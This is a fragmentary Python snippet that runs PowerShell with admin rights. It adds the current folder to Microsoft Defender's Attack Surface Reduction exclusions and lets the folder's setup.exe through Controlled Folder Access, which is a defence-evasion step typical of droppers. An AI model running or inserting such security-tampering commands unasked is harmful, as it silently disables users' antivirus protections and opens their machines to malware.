...
def run(cmd):
        subprocess.run(["powershell", cmd], capture_output=False)
...
if is_admin():
    ...
    cwd = os.getcwd()
    run('Set-MpPreference -AttackSurfaceReductionOnlyExclusions "'+cwd+'"')
    ...
    run('Set-MpPreference -ControlledFolderAccessAllowedApplications "'+cwd+'\setup.exe"')
